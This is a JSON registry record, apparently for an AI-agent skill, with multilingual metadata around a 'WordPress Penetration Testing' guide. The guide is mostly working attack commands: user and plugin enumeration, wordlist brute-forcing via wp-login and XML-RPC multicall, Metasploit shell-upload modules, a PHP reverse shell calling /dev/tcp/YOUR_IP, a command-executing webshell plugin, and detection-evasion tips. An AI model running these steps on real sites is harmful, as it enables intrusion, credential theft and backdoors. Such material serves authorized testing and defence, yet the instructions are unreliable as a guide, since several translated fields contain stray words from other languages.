ones de WordPress, incluyendo enumeración de usuarios, temas y plugins","fr":"Effectuez des évaluations de sécurité complètes des installations WordPress, y compris l''énumération des utilisateurs, thèmes et plugins","de":"Führen Sie umfassende Sicherheitsbewertungen von WordPress-Installationen durch, einschließlich der Aufzählung von Benutzern, Themes und Plugins","pt":"Conducte avaliações de segurança abrangentes em instalações WordPress, incluindo enumeração de usuários, temas e plugins","ru":"Проводите комплексные оценки безопасности установок WordPress, включая перечисление пользователей, тем и плагинов","ar":"اجري تقييمات أمنية شاملة لتركيبات ووردبريس، بما في ذلك تعداد المستخدمين والسمات والإضافات","en":""},"definition":{"en":""},"features":{"zh":["WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","cURL"],"ja":["WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","cURL"],"ko":["WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","cURL"],"es":["Enumeración de usuarios y roles","Análisis de vulnerabilidades en plugins y temas","Ataques de credenciales y técnicas de explotación","Uso de herramientas como WPScan y Metasploit","Análisis de seguridad con Burp Suite o OWASP ZAP"],"fr":["Énumération des utilisateurs et des rôles","Analyse des vulnérabilités dans les plugins et les thèmes","Attaques de mots de passe et techniques d''exploitation","Utilisation d''outils tels que WPScan et Metasploit","Analyse de sécurité avec Burp Suite ou OWASP ZAP"],"de":["Auflistung von Benutzern und Rollen","Analyse von Schwachstellen in Plugins und Themes","Angriffe auf Zugangsdaten und Ausnutzungstechniken","Verwendung von Tools wie WPScan und Metasploit","Sicherheitsanalyse mit Burp Suite oder OWASP ZAP"],"pt":["Enumeração de usuários e perfis","Análise de temas e plugins","Verificação de vulnerabilidades","Ataques de credenciais","Técnicas de exploração"],"ru":["Перечисление пользователей и профилей","Анализ тем и плагинов","Проверка уязвимостей","Атаки на учетные данные","Методы эксплуатации"],"ar":["تعداد المستخدمين والملفات الشخصية","تحليل السمات والإضافات","فحص الثغرات الأمنية","هجمات على بيانات الاعتماد","تقنيات الاستغلال"]},"keywords":{"zh":["WordPress","WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","cURL","Web"],"ja":["WordPress","WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","cURL","Web"],"ko":["WordPress","WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","cURL","Web"],"es":["pruebas de penetración","seguridad de WordPress","WPScan","Metasploit","Burp Suite","OWASP ZAP","análisis de vulnerabilidades","ataques de credenciales"],"fr":["tests de pénétration","sécurité WordPress","WPScan","Metasploit","Burp Suite","OWASP ZAP","analyse de vulnérabilités","attaques de mots de passe"],"de":["Penetrationstests","WordPress-Sicherheit","WPScan","Metasploit","Burp Suite","OWASP ZAP","Schwachstellenanalyse","Angriffe auf Zugangsdaten"],"pt":["teste de penetração","segurança wordpress","WPScan","Metasploit","vulnerabilidades","ataques de credenciais","desenvolvedores web"],"ru":["тестирование на проникновение","безопасность wordpress","WPScan","Metasploit","уязвимости","атаки на учетные данные","веб-разработчики"],"ar":["اختبار اختراق","أمن ووردبريس","WPScan","Metasploit","ثغرات أمنية","هجمات على بيانات الاعتماد","مطوري الويب"]}},"owner":"xiangteng007","repo":"XXT-AGENT","repoPath":"xiangteng007/XXT-AGENT","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.462Z","topics":[],"category":"community","skillMd":{"name":"WordPress Penetration Testing","description":"This skill should be used when the user asks to pentest WordPress sites, scan WordPress for vulnerabilities, enumerate WordPress users, themes, or plugins, exploit WordPress vulnerabilities, or use WPScan. It provides comprehensive WordPress security assessment methodologies.","version":"1.1","bodyPreview":"# WordPress Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.\n\n## Prerequisites\n\n### Required Tools\n- WPScan (pre-installed in Kali Linux)\n- Metasploit Framework\n- Burp Suite or OWASP ZAP\n- Nmap for initial discovery\n- cURL","body":"# WordPress Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.\n\n## Prerequisites\n\n### Required Tools\n- WPScan (pre-installed in Kali Linux)\n- Metasploit Framework\n- Burp Suite or OWASP ZAP\n- Nmap for initial discovery\n- cURL or wget\n\n### Required Knowledge\n- WordPress architecture and structure\n- Web application testing fundamentals\n- HTTP protocol understanding\n- Common web vulnerabilities (OWASP Top 10)\n\n## Outputs and Deliverables\n\n1. **WordPress Enumeration Report** - Version, themes, plugins, users\n2. **Vulnerability Assessment** - Identified CVEs and misconfigurations\n3. **Credential Assessment** - Weak password findings\n4. **Exploitation Proof** - Shell access documentation\n\n## Core Workflow\n\n### Phase 1: WordPress Discovery\n\nIdentify WordPress installations:\n\n```bash\n# Check for WordPress indicators\ncurl -s http://target.com | grep -i wordpress\ncurl -s http://target.com | grep -i \"wp-content\"\ncurl -s http://target.com | grep -i \"wp-includes\"\n\n# Check common WordPress paths\ncurl -I http://target.com/wp-login.php\ncurl -I http://target.com/wp-admin/\ncurl -I http://target.com/wp-content/\ncurl -I http://target.com/xmlrpc.php\n\n# Check meta generator tag\ncurl -s http://target.com | grep \"generator\"\n\n# Nmap WordPress detection\nnmap -p 80,443 --script http-wordpress-enum target.com\n```\n\nKey WordPress files and directories:\n- `/wp-admin/` - Admin dashboard\n- `/wp-login.php` - Login page\n- `/wp-content/` - Themes, plugins, uploads\n- `/wp-includes/` - Core files\n- `/xmlrpc.php` - XML-RPC interface\n- `/wp-config.php` - Configuration (not accessible if secure)\n- `/readme.html` - Version information\n\n### Phase 2: Basic WPScan Enumeration\n\nComprehensive WordPress scanning with WPScan:\n\n```bash\n# Basic scan\nwpscan --url http://target.com/wordpress/\n\n# With API token (for vulnerability data)\nwpscan --url http://target.com --api-token YOUR_API_TOKEN\n\n# Aggressive detection mode\nwpscan --url http://target.com --detection-mode aggressive\n\n# Output to file\nwpscan --url http://target.com -o results.txt\n\n# JSON output\nwpscan --url http://target.com -f json -o results.json\n\n# Verbose output\nwpscan --url http://target.com -v\n```\n\n### Phase 3: WordPress Version Detection\n\nIdentify WordPress version:\n\n```bash\n# WPScan version detection\nwpscan --url http://target.com\n\n# Manual version checks\ncurl -s http://target.com/readme.html | grep -i version\ncurl -s http://target.com/feed/ | grep -i generator\ncurl -s http://target.com | grep \"?ver=\"\n\n# Check meta generator\ncurl -s http://target.com | grep ''name=\"generator\"''\n\n# Check RSS feeds\ncurl -s http://target.com/feed/\ncurl -s http://target.com/comments/feed/\n```\n\nVersion sources:\n- Meta generator tag in HTML\n- readme.html file\n- RSS/Atom feeds\n- JavaScript/CSS file versions\n\n### Phase 4: Theme Enumeration\n\nIdentify installed themes:\n\n```bash\n# Enumerate all themes\nwpscan --url http://target.com -e at\n\n# Enumerate vulnerable themes only\nwpscan --url http://target.com -e vt\n\n# Theme enumeration with detection mode\nwpscan --url http://target.com -e at --plugins-detection aggressive\n\n# Manual theme detection\ncurl -s http://target.com | grep \"wp-content/themes/\"\ncurl -s http://target.com/wp-content/themes/\n```\n\nTheme vulnerability checks:\n```bash\n# Search for theme exploits\nsearchsploit wordpress theme <theme_name>\n\n# Check theme version\ncurl -s http://target.com/wp-content/themes/<theme>/style.css | grep -i version\ncurl -s http://target.com/wp-content/themes/<theme>/readme.txt\n```\n\n### Phase 5: Plugin Enumeration\n\nIdentify installed plugins:\n\n```bash\n# Enumerate all plugins\nwpscan --url http://target.com -e ap\n\n# Enumerate vulnerable plugins only\nwpscan --url http://target.com -e vp\n\n# Aggressive plugin detection\nwpscan --url http://target.com -e ap --plugins-detection aggressive\n\n# Mixed detection mode\nwpscan --url http://target.com -e ap --plugins-detection mixed\n\n# Manual plugin discovery\ncurl -s http://target.com | grep \"wp-content/plugins/\"\ncurl -s http://target.com/wp-content/plugins/\n```\n\nCommon vulnerable plugins to check:\n```bash\n# Search for plugin exploits\nsearchsploit wordpress plugin <plugin_name>\nsearchsploit wordpress mail-masta\nsearchsploit wordpress slideshow gallery\nsearchsploit wordpress reflex gallery\n\n# Check plugin version\ncurl -s http://target.com/wp-content/plugins/<plugin>/readme.txt\n```\n\n### Phase 6: User Enumeration\n\nDiscover WordPress users:\n\n```bash\n# WPScan user enumeration\nwpscan --url http://target.com -e u\n\n# Enumerate specific number of users\nwpscan --url http://target.com -e u1-100\n\n# Author ID enumeration (manual)\nfor i in {1..20}; do\n    curl -s \"http://target.com/?author=$i\" | grep -o ''author/[^/]*/''\ndone\n\n# JSON API user enumeration (if enabled)\ncurl -s http://target.com/wp-json/wp/v2/users\n\n# REST API user enumeration\ncurl -s http://target.com/wp-json/wp/v2/users?per_page=100\n\n# Login error enumeration\ncurl -X POST -d \"log=admin&pwd=wrongpass\" http://target.com/wp-login.php\n```\n\n### Phase 7: Comprehensive Enumeration\n\nRun all enumeration modules:\n\n```bash\n# Enumerate everything\nwpscan --url http://target.com -e at -e ap -e u\n\n# Alternative comprehensive scan\nwpscan --url http://target.com -e vp,vt,u,cb,dbe\n\n# Enumeration flags:\n# at - All themes\n# vt - Vulnerable themes\n# ap - All plugins\n# vp - Vulnerable plugins\n# u  - Users (1-10)\n# cb - Config backups\n# dbe - Database exports\n\n# Full aggressive enumeration\nwpscan --url http://target.com -e at,ap,u,cb,dbe \\\n    --detection-mode aggressive \\\n    --plugins-detection aggressive\n```\n\n### Phase 8: Password Attacks\n\nBrute-force WordPress credentials:\n\n```bash\n# Single user brute-force\nwpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt\n\n# Multiple users from file\nwpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt\n\n# With password attack threads\nwpscan --url http://target.com -U admin -P passwords.txt --password-attack wp-login -t 50\n\n# XML-RPC brute-force (faster, may bypass protection)\nwpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc\n\n# Brute-force with API limiting\nwpscan --url http://target.com -U admin -P passwords.txt --throttle 500\n\n# Create targeted wordlist\ncewl http://target.com -w wordlist.txt\nwpscan --url http://target.com -U admin -P wordlist.txt\n```\n\nPassword attack methods:\n- `wp-login` - Standard login form\n- `xmlrpc` - XML-RPC multicall (faster)\n- `xmlrpc-multicall` - Multiple passwords per request\n\n### Phase 9: Vulnerability Exploitation\n\n#### Metasploit Shell Upload\n\nAfter obtaining credentials:\n\n```bash\n# Start Metasploit\nmsfconsole\n\n# Admin shell upload\nuse exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS target.com\nset USERNAME admin\nset PASSWORD jessica\nset TARGETURI /wordpress\nset LHOST <your_ip>\nexploit\n```\n\n#### Plugin Exploitation\n\n```bash\n# Slideshow Gallery exploit\nuse exploit/unix/webapp/wp_slideshowgallery_upload\nset RHOSTS target.com\nset TARGETURI /wordpress\nset USERNAME admin\nset PASSWORD jessica\nset LHOST <your_ip>\nexploit\n\n# Search for WordPress exploits\nsearch type:exploit platform:php wordpress\n```\n\n#### Manual Exploitation\n\nTheme/plugin editor (with admin access):\n\n```php\n// Navigate to Appearance > Theme Editor\n// Edit 404.php or functions.php\n// Add PHP reverse shell:\n\n<?php\nexec(\"/bin/bash -c ''bash -i >& /dev/tcp/YOUR_IP/4444 0>&1''\");\n?>\n\n// Or use weevely backdoor\n// Access via: http://target.com/wp-content/themes/theme_name/404.php\n```\n\nPlugin upload method:\n\n```bash\n# Create malicious plugin\ncat > malicious.php << ''EOF''\n<?php\n/*\nPlugin Name: Malicious Plugin\nDescription: Security Testing\nVersion: 1.0\n*/\nif(isset($_GET[''cmd''])){\n    system($_GET[''cmd'']);\n}\n?>\nEOF\n\n# Zip and upload via Plugins > Add New > Upload Plugin\nzip malicious.zip malicious.php\n\n# Access webshell\ncurl \"http://target.com/wp-content/plugins/malicious/malicious.php?cmd=id\"\n```\n\n### Phase 10: Advanced Techniques\n\n#### XML-RPC Exploitation\n\n```bash\n# Check if XML-RPC is enabled\ncurl -X POST http://target.com/xmlrpc.php\n\n# List available methods\ncurl -X POST -d ''<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>'' http://target.com/xmlrpc.php\n\n# Brute-force via XML-RPC multicall\ncat > xmlrpc_brute.xml << ''EOF''\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>system.multicall</methodName>\n<params>\n<param><value><array><data>\n<value><struct>\n<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>\n<member><name>params</name><value><array><data>\n<value><string>admin</string></value>\n<value><string>password1</string></value>\n</data></array></value></member>\n</struct></value>\n<value><struct>\n<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>\n<member><name>params</name><value><array><data>\n<value><string>admin</string></value>\n<value><string>password2</string></value>\n</data></array></value></member>\n</struct></value>\n</data></array></value></param>\n</params>\n</methodCall>\nEOF\n\ncurl -X POST -d @xmlrpc_brute.xml http://target.com/xmlrpc.php\n```\n\n#### Scanning Through Proxy\n\n```bash\n# Use Tor proxy\nwpscan --url http://target.com --proxy socks5://127.0.0.1:9050\n\n# HTTP proxy\nwpscan --url http://target.com --proxy http://127.0.0.1:8080\n\n# Burp Suite proxy\nwpscan --url http://target.com --proxy http://127.0.0.1:8080 --disable-tls-checks\n```\n\n#### HTTP Authentication\n\n```bash\n# Basic authentication\nwpscan --url http://target.com --http-auth admin:password\n\n# Force SSL/TLS\nwpscan --url https://target.com --disable-tls-checks\n```\n\n## Quick Reference\n\n### WPScan Enumeration Flags\n\n| Flag | Description |\n|------|-------------|\n| `-e at` | All themes |\n| `-e vt` | Vulnerable themes |\n| `-e ap` | All plugins |\n| `-e vp` | Vulnerable plugins |\n| `-e u` | Users (1-10) |\n| `-e cb` | Config backups |\n| `-e dbe` | Database exports |\n\n### Common WordPress Paths\n\n| Path | Purpose |\n|------|---------|\n| `/wp-admin/` | Admin dashboard |\n| `/wp-login.php` | Login page |\n| `/wp-content/uploads/` | User uploads |\n| `/wp-includes/` | Core files |\n| `/xmlrpc.php` | XML-RPC API |\n| `/wp-json/` | REST API |\n\n### WPScan Command Examples\n\n| Purpose | Command |\n|---------|---------|\n| Basic scan | `wpscan --url http://target.com` |\n| All enumeration | `wpscan --url http://target.com -e at,ap,u` |\n| Password attack | `wpscan --url http://target.com -U admin -P pass.txt` |\n| Aggressive | `wpscan --url http://target.com --detection-mode aggressive` |\n\n## Constraints and Limitations\n\n### Legal Considerations\n- Obtain written authorization before testing\n- Stay within defined scope\n- Document all testing activities\n- Follow responsible disclosure\n\n### Technical Limitations\n- WAF may block scanning\n- Rate limiting may prevent brute-force\n- Some plugins may have false negatives\n- XML-RPC may be disabled\n\n### Detection Evasion\n- Use random user agents: `--random-user-agent`\n- Throttle requests: `--throttle 1000`\n- Use proxy rotation\n- Avoid aggressive modes on monitored sites\n\n## Troubleshooting\n\n### WPScan Shows No Vulnerabilities\n\n**Solutions:**\n1. Use API token for vulnerability database\n2. Try aggressive detection mode\n3. Check for WAF blocking scans\n4. Verify WordPress is actually installed\n\n### Brute-Force Blocked\n\n**Solutions:**\n1. Use XML-RPC method instead of wp-login\n2. Add throttling: `--throttle 500`\n3. Use different user agents\n4. Check for IP blocking/fail2ban\n\n### Cannot Access Admin Panel\n\n**Solutions:**\n1. Verify credentials are correct\n2. Check for two-factor authentication\n3. Look for IP whitelist restrictions\n4. Check for login URL changes (security plugins)\n"},"lastSynced":"2026-02-18T07:58:29.328Z","agentAnalysis":{"suitability":{"en":"Ideal for Cybersecurity Agents specializing in web application vulnerability assessment and penetration testing of WordPress installations","zh":"适用于专门从事Web应用程序漏洞评估和WordPress安装渗透测试的网络安全代理","ja":"Webアプリケーションの脆弱性評価とWordPressインストールのペネトレーションテストを専門とするサイバーセキュリティエージェントに最適","ko":"웹 애플리케이션 취약점 평가 및 워드프레스 설치에 대한 침투 테스트를 전문으로 하는 사이버 보안 에이전트에 적합","es":"Ideal para agentes de ciberseguridad especializados en evaluación de vulnerabilidades de aplicaciones web y pruebas de penetración de instalaciones de WordPress","fr":"Idéal pour les agents de cybersécurité spécialisés dans l''évaluation des vulnérabilités des applications Web et les tests de pénétration des installations WordPress","de":"Ideal für Cyber-Sicherheits-Agenten, die sich auf die Bewertung von Sicherheitslücken in Webanwendungen und Penetrationstests von WordPress-Installationen spezialisiert haben","pt":"Ideal para Agentes de Cibersegurança especializados em avaliação de vulnerabilidades de aplicativos web e testes de penetração de instalações do WordPress","ru":"Идеально для агентов кибербезопасности, специализирующихся на оценке уязвимостей веб-приложений и тестировании на проникновение в установки WordPress","ar":"مثالي لعمليات وكيل الأمن السيبراني المتخصصة في تقييم脆弱ات تطبيقات الويب واختبار الاختراق لتثبيتات ووردبريس"},"recommendation":{"en":"Empowers agents to conduct comprehensive security assessments using WPScan, Metasploit Framework, and Burp Suite, enabling enumeration of users, themes, and plugins, vulnerability scanning, and exploitation techniques via protocols like HTTP and tools such as cURL and Nmap","zh":"赋予代理进行全面的安全评估的能力，使用WPScan、Metasploit Framework和Burp Suite，实现用户、主题和插件的枚举、漏洞扫描和通过HTTP等协议和cURL、Nmap等工具的利用技术","ja":"WPScan、Metasploit Framework、Burp Suiteを使用して、ユーザー、テーマ、プラグインの列挙、脆弱性のスキャニング、HTTPなどのプロトコルとcURL、Nmapなどのツールを使用した利用技術を可能にすることで、エージェントが包括的なセキュリティ評価を実施できるようにする","ko":"WPScan, Metasploit Framework 및 Burp Suite를 사용하여 에이전트가 HTTP 및 cURL, Nmap과 같은 도구를 사용한 완전한 보안 평가를 수행할 수 있도록 하여 사용자, 테마 및 플러그인의 열거, 취약점 스캔 및 khai thác 기술을 구현할 수 있다","es":"Habilita a los agentes a realizar evaluaciones de seguridad integrales utilizando WPScan, Metasploit Framework y Burp Suite, lo que permite la enumeración de usuarios, temas y complementos, análisis de vulnerabilidades y técnicas de explotación a través de protocolos como HTTP y herramientas como cURL y Nmap","fr":"Permet aux agents de réaliser des évaluations de sécurité complètes en utilisant WPScan, Metasploit Framework et Burp Suite, ce qui permet l''énumération des utilisateurs, des thèmes et des plugins, l''analyse des vulnérabilités et les techniques d''exploitation via des protocoles tels que HTTP et des outils tels que cURL et Nmap","de":"Ermächtigt die Agenten, umfassende Sicherheitsbewertungen mit WPScan, Metasploit Framework und Burp Suite durchzuführen, wodurch die Auflistung von Benutzern, Themen und Plugins, die Schwachstellenanalyse und die Ausnutzungstechniken über Protokolle wie HTTP und Tools wie cURL und Nmap ermöglicht werden","pt":"Habilita os agentes a realizar avaliações de segurança abrangentes usando WPScan, Metasploit Framework e Burp Suite, permitindo a enumeração de usuários, temas e plugins, varredura de vulnerabilidades e técnicas de exploração via protocolos como HTTP e ferramentas como cURL e Nmap","ru":"Позволяет агентам проводить всесторонние оценки безопасности с использованием WPScan, Metasploit Framework и Burp Suite, обеспечивая перечисление пользователей, тем и плагинов, сканирование уязвимостей и методы эксплуатации через протоколы, такие как HTTP, и инструменты, такие как cURL и Nmap","ar":"تمكّن الوكيل من إجراء تقييمات أمنية شاملة باستخدام WPScan و Metasploit Framework و Burp Suite، وتمكين تعداد المستخدمين والسمات والإضافات و فحص الثغرات واستغلال التقنيات عبر بروتوكولات مثل HTTP وأدوات مثل cURL و Nmap"},"useCases":{"en":["Enumerating WordPress users, themes, and plugins for vulnerability identification","Conducting credential attacks and exploiting vulnerabilities using Metasploit Framework","Performing comprehensive vulnerability scans with WPScan and analyzing results with Burp Suite or OWASP ZAP"],"zh":["枚举WordPress用户、主题和插件以识别漏洞","使用Metasploit Framework进行凭证攻击和利用漏洞","使用WPScan进行全面的漏洞扫描，并使用Burp Suite或OWASP ZAP分析结果"],"ja":["WordPressユーザー、テーマ、プラグインを列挙して脆弱性を特定する","Metasploit Frameworkを使用してクレデンシャル攻撃と脆弱性の利用を行う","WPScanを使用して包括的な脆弱性のスキャニングを行い、Burp SuiteまたはOWASP ZAPで結果を分析する"],"ko":["워드프레스 사용자, 테마 및 플러그인을 열거하여 취약점을 식별","메타스플로이트 프레임워크를 사용하여 자격 증명 공격 및 취약점 khai thác","WPScan을 사용하여 완전한 취약점 스캔을 수행하고 Burp Suite 또는 OWASP ZAP에서 결과를 분석"],"es":["Enumerar usuarios, temas y plugins de WordPress para la identificación de vulnerabilidades","Realizar ataques de credenciales y explotar vulnerabilidades utilizando Metasploit Framework","Realizar análisis de vulnerabilidades integrales con WPScan y analizar los resultados con Burp Suite u OWASP ZAP"],"fr":["Énumérer les utilisateurs, les thèmes et les plugins WordPress pour l''identification des vulnérabilités","Réalisé des attaques de mots de passe et exploiter les vulnérabilités à l''aide de Metasploit Framework","Réalisé des analyses de vulnérabilités complètes avec WPScan et analyser les résultats avec Burp Suite ou OWASP ZAP"],"de":["Benutzer, Themes und Plugins von WordPress auflisten, um Sicherheitslücken zu identifizieren","Zugriffsangriffe durchführen und Sicherheitslücken mit Metasploit Framework ausnutzen","Umfassende Schwachstellenanalysen mit WPScan durchführen und die Ergebnisse mit Burp Suite oder OWASP ZAP analysieren"],"pt":["Enumerar usuários, temas e plugins do WordPress para identificação de vulnerabilidades","Realizar ataques de credenciais e explorar vulnerabilidades usando Metasploit Framework","Realizar varreduras de vulnerabilidades abrangentes com WPScan e analisar resultados com Burp Suite ou OWASP ZAP"],"ru":["Перечисление пользователей, тем и плагинов WordPress для выявления уязвимостей","Проведение атак на учетные данные и эксплуатация уязвимостей с помощью Metasploit Framework","Проведение всесторонних сканирований уязвимостей с помощью WPScan и анализ результатов с помощью Burp Suite или OWASP ZAP"],"ar":["تعداد مستخدمي ووردبريس والسمات والإضافات لتحديد الثغرات","إجراء هجمات على بيانات الاعتماد واستغلال الثغرات باستخدام إطار Metasploit","إجراء مسح شامل للثغرات باستخدام WPScan و تحليل النتائج باستخدام Burp Suite أو OWASP ZAP"]},"limitations":{"en":["Requires specific tools pre-installed, such as WPScan, Metasploit Framework, Burp Suite or OWASP ZAP, and Nmap","Limited to WordPress installations, may not be applicable to other CMS platforms"],"zh":["需要预先安装特定的工具，如WPScan、Metasploit Framework、Burp Suite或OWASP ZAP和Nmap","仅限于WordPress安装，可能不适用于其他CMS平台"],"ja":["WPScan、Metasploit Framework、Burp Suite、OWASP ZAP、Nmapなどの特定のツールを事前にインストールする必要がある","WordPressインストールに限定されており、他のCMSプラットフォームには適用できない可能性がある"],"ko":["WPScan, Metasploit Framework, Burp Suite, OWASP ZAP 및 Nmap과 같은 특정 도구를 사전 설치해야 함","워드프레스 설치에만 국한되어 있으며 다른 CMS 플랫폼에는 적용할 수 없을 수 있음"],"es":["Requiere herramientas específicas preinstaladas, como WPScan, Metasploit Framework, Burp Suite u OWASP ZAP, y Nmap","Limitado a instalaciones de WordPress, puede que no sea aplicable a otras plataformas de CMS"],"fr":["Nécessite des outils spécifiques préinstallés, tels que WPScan, Metasploit Framework, Burp Suite ou OWASP ZAP, et Nmap","Limité aux installations WordPress, peut ne pas être applicable à d''autres plates-formes de CMS"],"de":["Benötigt spezifische vorinstallierte Tools wie WPScan, Metasploit Framework, Burp Suite oder OWASP ZAP und Nmap","Begrenzt auf WordPress-Installationen, kann möglicherweise nicht auf andere CMS-Plattformen angewendet werden"],"pt":["Exige ferramentas específicas pré-instaladas, como WPScan, Metasploit Framework, Burp Suite ou OWASP ZAP e Nmap","Limitado a instalações do WordPress, pode não ser aplicável a outras plataformas de CMS"],"ru":["Требует предварительной установки специальных инструментов, таких как WPScan, Metasploit Framework, Burp Suite или OWASP ZAP и Nmap","Ограничен установками WordPress, может быть не применим к другим платформам CMS"],"ar":["يتطلب تثبيت أدوات محددة مسبقاً، مثل WPScan و إطار Metasploit و Burp Suite أو OWASP ZAP و Nmap","محدود بتثبيتات ووردبريس، قد لا يكون قابلاً للتطبيق على منصات إدارة المحتوى الأخرى"]},"version":3},"qualityScore":75}');
